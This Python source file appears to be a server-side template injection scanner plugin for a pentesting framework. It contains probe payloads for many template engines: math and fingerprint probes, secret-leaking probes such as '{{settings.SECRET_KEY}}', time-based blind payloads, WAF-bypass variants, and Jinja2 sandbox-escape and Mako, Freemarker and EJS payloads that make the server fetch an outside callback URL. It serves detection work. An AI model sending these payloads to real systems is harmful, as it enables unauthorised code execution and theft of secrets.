"""Server-Side Template Injection (SSTI) detection — tplmap-level engine coverage.

Detects SSTI across 15+ template engines with math-based probes,
engine-specific fingerprinting, blind SSTI (time-based + OOB),
WAF bypass integration, and multi-vector injection (GET, POST, headers).
"""

from __future__ import annotations

import asyncio
import time
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# ---------------------------------------------------------------------------
# Math probes — unique multipliers reduce false positives
# ---------------------------------------------------------------------------

MATH_PROBES: list[tuple[str, str, list[str]]] = [
    # (payload, expected_output, candidate_engines)
    ("{{7*191}}", "1337", ["jinja2", "twig", "nunjucks", "liquid"]),
    ("${7*191}", "1337", ["freemarker", "velocity", "thymeleaf", "mako", "el"]),
    ("#{7*191}", "1337", ["ruby_erb", "thymeleaf_inline", "pebble"]),
    ("<%= 7*191 %>", "1337", ["erb", "ejs", "asp"]),
    ("@(7*191)", "1337", ["razor"]),
    ("${{7*191}}", "1337", ["thymeleaf_expression"]),
    ("{{= 7*191}}", "1337", ["jade", "pug"]),
    ("{7*191}", "1337", ["smarty"]),
    ("#set($x=7*191)${x}", "1337", ["velocity"]),
    ("[= 7*191 =]", "1337", ["latte"]),
]

# ---------------------------------------------------------------------------
# Engine differentiation probes — fingerprint the exact engine
# ---------------------------------------------------------------------------

ENGINE_FINGERPRINTS: list[tuple[str, str, str]] = [
    # (payload, expected_output, engine_name)
    # Jinja2: string multiplication yields repeated string
    ("{{7*'7'}}", "7777777", "jinja2"),
    # Twig: string multiplication yields concatenation
    ("{{'7'*7}}", "7777777", "twig"),
    # Jinja2: config object leak
    ("{{config}}", "<Config", "jinja2_flask"),
    # Jinja2: self reference
    ("{{self}}", "TemplateReference", "jinja2_self"),
    # Twig: _self
    ("{{_self.env.display('x')}}", "x", "twig_confirmed"),
    # Mako: module namespace
    ("${self.module.__name__}", "", "mako"),
    # Freemarker: version disclosure
    ("${.version}", "", "freemarker"),
    ("${product}", "", "freemarker_product"),
    # Velocity: class introspection
    ("$class.inspect('java.lang.Runtime')", "", "velocity"),
    # Thymeleaf: Spring EL
    ("${T(java.lang.Runtime)}", "java.lang.Runtime", "spring_el"),
    # Smarty: phpinfo
    ("{php}echo 'BSKSSTI';{/php}", "BSKSSTI", "smarty_php"),
    ("{system('echo BSKSSTI')}", "BSKSSTI", "smarty_system"),
    # Pebble: string class
    ("{{'x'.getClass()}}", "java.lang.String", "pebble"),
    # EJS: process disclosure
    ("<%= typeof process %>", "object", "ejs"),
    # Handlebars / Mustache: section test
    ("{{#with 'x'}}{{.}}{{/with}}", "x", "handlebars"),
    # Nunjucks: range filter
    ("{{range(5)}}", "[0, 1, 2, 3, 4]", "nunjucks"),
    # ERB: Ruby object
    ("<%= 7.class %>", "Integer", "erb"),
    # Tornado: handler leak
    ("{{handler.settings}}", "", "tornado"),
    # Django: debug
    ("{{settings.SECRET_KEY}}", "", "django"),
    ("{% debug %}", "", "django_debug"),
    # Jade/Pug: JS execution
    ("#{7*191}", "1337", "jade_pug"),
]

# ---------------------------------------------------------------------------
# Blind SSTI payloads — time-based
# ---------------------------------------------------------------------------

BLIND_SSTI_PAYLOADS: list[tuple[str, float, str]] = [
    # (payload, min_delay_seconds, engine)
    ("{% for x in range(99999999) %}{% endfor %}", 2.0, "jinja2"),
    ("{{range(99999999)|join}}", 2.0, "jinja2_filter"),
    ("<% import time; time.sleep(3) %>", 3.0, "mako"),
    ("${Thread.sleep(3000)}", 3.0, "freemarker"),
    ("<%java.lang.Thread.sleep(3000);%>", 3.0, "jsp"),
    ("<%= sleep(3) %>", 3.0, "erb"),
    ("{php}sleep(3);{/php}", 3.0, "smarty"),
]

# ---------------------------------------------------------------------------
# Injection surfaces
# ---------------------------------------------------------------------------

SCAN_PARAMS = [
    "q", "search", "query", "name", "template", "page", "view",
    "content", "message", "text", "title", "comment", "value",
    "input", "data", "body", "subject", "desc", "render",
]

SCAN_PAGES = [
    "/", "/search", "/contact", "/feedback", "/api/render",
    "/preview", "/template", "/eval", "/test",
]

HEADER_INJECTION_TARGETS = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Forwarded-Host",
]


class SstiCheckPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="ssti_check",
        display_name="SSTI Check",
        category=PluginCategory.PENTESTING,
        description=(
            "Detects Server-Side Template Injection across 15+ engines "
            "with math probes, fingerprinting, blind detection, and WAF bypass"
        ),
        produces=["ssti_findings"],
        timeout=60.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"ssti_tests": []},
            )

        # Collect payloads from PayloadEngine if available
        extra_ssti_payloads: list[tuple[str, str, str]] = []
        if ctx.payloads:
            from basilisk.utils.payloads import PayloadCategory
            for p in ctx.payloads.get(PayloadCategory.SSTI, max_waf=1):
                if p.description and "probe" in p.description.lower():
                    extra_ssti_payloads.append((p.value, "", p.description))

        # Phase 1: Math-based detection on GET/POST params
        await self._phase_math_probes(
            ctx, base_url, findings, tested,
        )

        # Phase 2: Engine fingerprinting (only if Phase 1 found something)
        if findings:
            await self._phase_fingerprint(
                ctx, base_url, findings, tested,
            )

        # Phase 3: Header injection vectors
        if not findings and not ctx.should_stop:
            await self._phase_header_injection(
                ctx, base_url, findings, tested,
            )

        # Phase 4: Blind SSTI (time-based)
        if not findings and not ctx.should_stop:
            await self._phase_blind_time(
                ctx, base_url, findings, tested,
            )

        # Phase 5: Blind SSTI (OOB via callback server)
        if not findings and not ctx.should_stop and ctx.callback:
            await self._phase_blind_oob(
                ctx, base_url, target.host, findings, tested,
            )

        if not findings:
            findings.append(Finding.info(
                "No SSTI vulnerabilities detected",
                tags=["pentesting", "ssti"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"ssti_tests": tested},
        )

    # ------------------------------------------------------------------
    # Phase 1: Math-based probes across GET + POST
    # ------------------------------------------------------------------

    async def _phase_math_probes(
        self, ctx, base_url: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        for page in SCAN_PAGES:
            if findings or ctx.should_stop:
                break
            for param in SCAN_PARAMS:
                if findings or ctx.should_stop:
                    break

                # Baseline: fetch clean value to avoid false positives
                baseline_get = await self._fetch_body(
                    ctx, "GET", f"{base_url}{page}?{param}=basilisk_baseline",
                )
                baseline_post = await self._fetch_body(
                    ctx, "POST", f"{base_url}{page}", data={param: "basilisk_baseline"},
                )

                for payload, expected, engines in MATH_PROBES:
                    if ctx.should_stop:
                        break

                    # Apply WAF bypass if engine available
                    payloads_to_test = self._waf_variants(ctx, payload)

                    for variant in payloads_to_test:
                        hit = await self._test_injection(
                            ctx, base_url, page, param, variant, expected,
                            baseline_get, baseline_post,
                        )
                        if hit:
                            method, body = hit
                            # Confirmation probe: use different math
                            confirmed = False
                            confirm_payload = variant.replace(
                                "7*191", "13*103",
                            )
                            confirm_expected = "1339"
                            if confirm_payload != variant:
                                confirm_hit = await self._test_injection(
                                    ctx, base_url, page, param,
                                    confirm_payload, confirm_expected,
                                    baseline_get, baseline_post,
                                )
                                confirmed = confirm_hit is not None
                            else:
                                confirmed = True  # Can't generate alt probe

                            engine_label = "/".join(engines)
                            tested.append({
                                "page": page, "param": param,
                                "payload": variant, "engines": engines,
                                "method": method, "confirmed": confirmed,
                            })
                            findings.append(Finding.critical(
                                f"SSTI {'confirmed' if confirmed else 'detected'}"
                                f": {engine_label} via {method} ?{param}= on {page}",
                                description=(
                                    f"Template expression evaluated server-side. "
                                    f"Candidate engines: {engine_label}. "
                                    f"Payload '{variant}' produced '{expected}'."
                                ),
                                evidence=(
                                    f"URL: {base_url}{page}\n"
                                    f"Method: {method}\nParam: {param}\n"
                                    f"Payload: {variant}\n"
                                    f"Expected: {expected}\n"
                                    f"Found in response: yes"
                                ),
                                remediation=(
                                    "Never pass user input directly into template "
                                    "expressions. Use sandboxed template environments. "
                                    "Apply strict input validation. Consider using "
                                    "logic-less templates (Mustache)."
                                ),
                                tags=["pentesting", "ssti", "injection"],
                            ))
                            return

    # ------------------------------------------------------------------
    # Phase 2: Engine fingerprinting
    # ------------------------------------------------------------------

    async def _phase_fingerprint(
        self, ctx, base_url: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Try engine-specific probes to narrow down the exact engine."""
        # Use first confirmed page/param from tested data
        confirmed = [t for t in tested if t.get("confirmed")]
        if not confirmed:
            return

        ep = confirmed[0]
        page = ep.get("page", "/")
        param = ep.get("param", "q")

        baseline_get = await self._fetch_body(
            ctx, "GET", f"{base_url}{page}?{param}=basilisk_baseline",
        )

        identified_engines: list[str] = []

        for payload, expected, engine_name in ENGINE_FINGERPRINTS:
            if ctx.should_stop:
                break
            if not expected:
                # For probes that just check for non-error, skip
                continue

            if expected in (baseline_get or ""):
                continue

            url = f"{base_url}{page}?{param}={quote(payload)}"
            body = await self._fetch_body(ctx, "GET", url)
            if body and expected in body:
                identified_engines.append(engine_name)
                tested.append({
                    "page": page, "param": param,
                    "payload": payload, "engine": engine_name,
                    "method": "GET", "fingerprint": True,
                })

        if identified_engines:
            engines_str = ", ".join(identified_engines)
            findings.append(Finding.high(
                f"SSTI engine fingerprinted: {engines_str}",
                description=(
                    f"Engine-specific probes confirmed template engine(s): "
                    f"{engines_str}. This enables targeted exploitation."
                ),
                evidence=f"Identified engines: {engines_str}",
                remediation=(
                    "Upgrade template engine to latest version. "
                    "Enable sandboxing. Restrict template language features."
                ),
                tags=["pentesting", "ssti", "fingerprint"],
            ))

    # ------------------------------------------------------------------
    # Phase 3: Header injection
    # ------------------------------------------------------------------

    async def _phase_header_injection(
        self, ctx, base_url: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test SSTI via HTTP headers (User-Agent, Referer, etc.)."""
        for page in SCAN_PAGES[:4]:
            if findings or ctx.should_stop:
                break

            # Baseline without injection
            baseline = await self._fetch_body(ctx, "GET", f"{base_url}{page}")

            for header_name in HEADER_INJECTION_TARGETS:
                if findings or ctx.should_stop:
                    break

                for payload, expected, engines in MATH_PROBES[:5]:
                    if not expected or (baseline and expected in baseline):
                        continue

                    try:
                        async with ctx.rate:
                            resp = await ctx.http.get(
                                f"{base_url}{page}",
                                headers={header_name: payload},
                                timeout=8.0,
                            )
                            body = await resp.text(
                                encoding="utf-8", errors="replace",
                            )
                    except Exception:
                        continue

                    if expected in body:
                        engine_label = "/".join(engines)
                        tested.append({
                            "page": page, "header": header_name,
                            "payload": payload, "engines": engines,
                            "method": "HEADER", "confirmed": True,
                        })
                        findings.append(Finding.critical(
                            f"SSTI via header {header_name}: {engine_label} on {page}",
                            description=(
                                f"Template injection via HTTP header '{header_name}'. "
                                f"Candidate engines: {engine_label}."
                            ),
                            evidence=(
                                f"URL: {base_url}{page}\n"
                                f"Header: {header_name}: {payload}\n"
                                f"Expected: {expected}\nFound in response: yes"
                            ),
                            remediation=(
                                "Never render HTTP headers through template engines. "
                                "Sanitize all server-side log/display of request headers."
                            ),
                            tags=["pentesting", "ssti", "header-injection"],
                        ))
                        return

    # ------------------------------------------------------------------
    # Phase 4: Blind time-based SSTI
    # ------------------------------------------------------------------

    async def _phase_blind_time(
        self, ctx, base_url: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Detect SSTI via time-based blind techniques."""
        for page in SCAN_PAGES[:3]:
            if findings or ctx.should_stop:
                break
            for param in SCAN_PARAMS[:5]:
                if findings or ctx.should_stop:
                    break

                # Measure baseline timing
                baseline_time = await self._measure_request_time(
                    ctx, f"{base_url}{page}?{param}=basilisk_safe",
                )
                if baseline_time is None:
                    continue

                for payload, min_delay, engine in BLIND_SSTI_PAYLOADS:
                    if ctx.should_stop:
                        break

                    elapsed = await self._measure_request_time(
                        ctx,
                        f"{base_url}{page}?{param}={quote(payload)}",
                    )
                    if elapsed is None:
                        continue

                    delta = elapsed - baseline_time
                    if delta >= min_delay * 0.7:
                        # Confirm with second attempt
                        confirm_time = await self._measure_request_time(
                            ctx,
                            f"{base_url}{page}?{param}={quote(payload)}",
                        )
                        if confirm_time and (confirm_time - baseline_time) >= min_delay * 0.7:
                            tested.append({
                                "page": page, "param": param,
                                "payload": payload, "engine": engine,
                                "method": "GET", "blind_time": True,
                                "delta": round(delta, 2),
                            })
                            findings.append(Finding.high(
                                f"Blind SSTI (time-based): {engine} "
                                f"via ?{param}= on {page}",
                                description=(
                                    f"Time-based blind template injection detected. "
                                    f"Engine: {engine}. Response delayed {delta:.1f}s "
                                    f"(baseline: {baseline_time:.1f}s)."
                                ),
                                evidence=(
                                    f"URL: {base_url}{page}\n"
                                    f"Param: {param}\nPayload: {payload}\n"
                                    f"Baseline: {baseline_time:.2f}s\n"
                                    f"Injection: {elapsed:.2f}s\n"
                                    f"Delta: {delta:.2f}s"
                                ),
                                remediation=(
                                    "Never pass user input into template "
                                    "expressions. Use sandboxed environments."
                                ),
                                tags=["pentesting", "ssti", "blind", "time-based"],
                            ))
                            return

    # ------------------------------------------------------------------
    # Phase 5: Blind OOB via CallbackServer
    # ------------------------------------------------------------------

    async def _phase_blind_oob(
        self, ctx, base_url: str, host: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Detect SSTI via out-of-band callbacks."""
        oob_payloads: list[tuple[str, str, str]] = []

        for engine_name, tpl in [
            ("jinja2",
             "{{{{''.__class__.__mro__[1].__subclasses__()[0]"
             ".__init__.__globals__['__builtins__']['__import__']"
             "('urllib.request').urlopen('{url}')}}}}"),
            ("mako",
             "${{__import__('urllib.request').urlopen('{url}')}}"),
            ("freemarker",
             "${{new java.net.URL(\"{url}\").openStream()}}"),
            ("ejs",
             "<%= require('http').get('{url}') %>"),
        ]:
            token = ctx.callback.generate_token(
                self.meta.name, host, "ssti_oob",
                description=f"SSTI OOB probe for {engine_name}",
            )
            url = ctx.callback.build_payload_url(token)
            payload = tpl.format(url=url)
            oob_payloads.append((payload, token, engine_name))

        for page in SCAN_PAGES[:3]:
            if findings or ctx.should_stop:
                break
            for param in SCAN_PARAMS[:5]:
                if findings or ctx.should_stop:
                    break

                for payload, _token, _engine_name in oob_payloads:
                    if ctx.should_stop:
                        break

                    # Send payload via GET
                    try:
                        async with ctx.rate:
                            await ctx.http.get(
                                f"{base_url}{page}?{param}={quote(payload)}",
                                timeout=10.0,
                            )
                    except Exception:
                        pass

                    # Send payload via POST
                    try:
                        async with ctx.rate:
                            await ctx.http.post(
                                f"{base_url}{page}",
                                data={param: payload},
                                timeout=10.0,
                            )
                    except Exception:
                        pass

        # Wait for OOB callbacks
        if oob_payloads:
            await asyncio.sleep(3)

            for _payload, token, engine_name in oob_payloads:
                if ctx.callback.has_callback(token):
                    tested.append({
                        "engine": engine_name,
                        "method": "OOB",
                        "blind_oob": True,
                        "token": token,
                    })
                    findings.append(Finding.critical(
                        f"Blind SSTI confirmed via OOB: {engine_name}",
                        description=(
                            f"Out-of-band callback received for {engine_name} "
                            f"SSTI payload. The server executed template code "
                            f"that fetched an external URL."
                        ),
                        evidence=f"OOB token: {token}\nEngine: {engine_name}",
                        remediation=(
                            "Never pass user input into template expressions. "
                            "Use sandboxed environments. Block outbound requests."
                        ),
                        tags=["pentesting", "ssti", "blind", "oob"],
                    ))

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    async def _fetch_body(
        ctx, method: str, url: str,
        data: dict | None = None,
    ) -> str | None:
        """Fetch response body, return None on failure."""
        try:
            async with ctx.rate:
                if method == "POST" and data is not None:
                    resp = await ctx.http.post(url, data=data, timeout=8.0)
                else:
                    resp = await ctx.http.get(url, timeout=8.0)
                return await resp.text(encoding="utf-8", errors="replace")
        except Exception:
            return None

    async def _test_injection(
        self, ctx, base_url: str, page: str, param: str,
        payload: str, expected: str,
        baseline_get: str | None, baseline_post: str | None,
    ) -> tuple[str, str] | None:
        """Test a single payload via GET and POST.

        Returns (method, body) if expected string found, else None.
        """
        if not expected:
            return None

        # Skip if expected already in baseline
        if baseline_get and expected in baseline_get:
            return None

        # GET test
        url = f"{base_url}{page}?{param}={quote(payload)}"
        body = await self._fetch_body(ctx, "GET", url)
        if body and expected in body:
            return ("GET", body)

        # POST test (skip if expected in POST baseline)
        if baseline_post and expected in baseline_post:
            return None

        body = await self._fetch_body(
            ctx, "POST", f"{base_url}{page}", data={param: payload},
        )
        if body and expected in body:
            return ("POST", body)

        return None

    @staticmethod
    def _waf_variants(ctx, payload: str) -> list[str]:
        """Generate WAF bypass variants if engine available."""
        variants = [payload]
        if ctx.waf_bypass and ctx.waf_bypass.waf_detected:
            waf_encoded = ctx.waf_bypass.encode(payload, "ssti")
            for v in waf_encoded:
                if v not in variants:
                    variants.append(v)
        return variants[:4]  # Limit to avoid excessive requests

    @staticmethod
    async def _measure_request_time(ctx, url: str) -> float | None:
        """Measure response time for a single request."""
        try:
            async with ctx.rate:
                t0 = time.monotonic()
                await ctx.http.get(url, timeout=15.0)
                return time.monotonic() - t0
        except Exception:
            return None
